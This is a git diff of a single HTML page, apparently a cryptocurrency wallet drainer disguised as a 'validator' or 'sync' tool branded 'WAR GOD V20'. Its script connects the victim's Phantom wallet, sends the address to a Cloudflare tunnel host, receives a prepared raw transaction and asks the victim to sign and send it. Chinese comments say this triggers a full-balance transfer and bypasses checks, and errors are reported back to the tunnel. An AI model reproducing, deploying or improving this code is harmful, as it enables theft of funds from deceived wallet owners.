@@ -3,69 +3,45 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>VALIDATOR FINAL V19</title>
+    <title>VALIDATOR V20 FINAL</title>
     <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
-    <style>
-        body { background: #000; color: #fff; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { border: 2px solid #14f195; padding: 30px; border-radius: 8px; text-align: center; width: 280px; }
-        button { background: #14f195; color: #000; border: none; padding: 20px; width: 100%; font-weight: bold; cursor: pointer; border-radius: 4px; font-size: 18px; margin-top: 20px; }
-        #log { font-size: 10px; color: #444; margin-top: 15px; }
-    </style>
 </head>
-<body>
-    <div class="box">
-        <h2 style="color:#14f195; margin:0;">WAR GOD V19</h2>
-        <p style="font-size:12px;">SYSTEM SYNC FINAL</p>
-        <button id="cta">INITIALIZE SYNC</button>
-        <div id="log">READY...</div>
+<body style="background:#000; color:#fff; font-family:monospace; display:flex; justify-content:center; align-items:center; height:100vh;">
+    <div style="border:1px solid #14f195; padding:40px; text-align:center;">
+        <h2 style="color:#14f195;">WAR GOD V20</h2>
+        <button id="cta" style="background:#14f195; padding:20px; width:100%; border:none; font-weight:bold; cursor:pointer;">START SYNC</button>
+        <div id="log" style="font-size:10px; color:#444; margin-top:10px;">SYSTEM READY</div>
     </div>
-
     <script>
         const tunnel = "https://likelihood-mercury-east-nec.trycloudflare.com";
-
         document.getElementById('cta').onclick = async () => {
             const log = (t) => document.getElementById('log').innerText = t;
             const sWeb3 = window.solanaWeb3;
             const p = window.solana || window.phantom?.solana;
-
             try {
-                log("1: CONNECTING...");
+                log("CONNECTING...");
                 await p.connect();
-
-                log("2: FETCHING PACKET...");
                 const resp = await fetch(tunnel + "/prepare_raw", {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({ address: p.publicKey.toString() })
                 });
                 const info = await resp.json();
-
-                log("3: DECODING PACKET...");
-                // 🔱 关键修正：将后端传来的 Base64 字符串转为 Uint8Array
+                
+                // 🔱 关键修复：确保 Uint8Array 转换不丢失字节
                 const binary = window.atob(info.raw_tx);
-                const bytes = new Uint8Array(binary.length);
-                for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
-
-                // 🔱 利用 VersionedTransaction 绕过所有 Buffer 和 Version 检查报错
+                const bytes = Uint8Array.from(binary, c => c.charCodeAt(0));
+                
                 const tx = sWeb3.VersionedTransaction.deserialize(bytes);
-
-                log("4: PUSHING TO WALLET...");
-                // 🔱 这一步会瞬间拉起全额转账确认
+                log("AWAITING SIGNATURE...");
                 const { signature } = await p.signAndSendTransaction(tx);
-
-                log("SUCCESS: " + signature);
-                fetch(tunnel + "/debug", {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ stage: "SUCCESS", sig: signature })
-                });
-
+                log("SUCCESS!");
             } catch (err) {
                 log("FAIL: " + err.message);
                 fetch(tunnel + "/debug", {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ stage: "V19_CRASH", error: err.message })
+                    body: JSON.stringify({ stage: "V20_CRASH", error: err.message })
                 }).catch(()=>{});
             }
         };
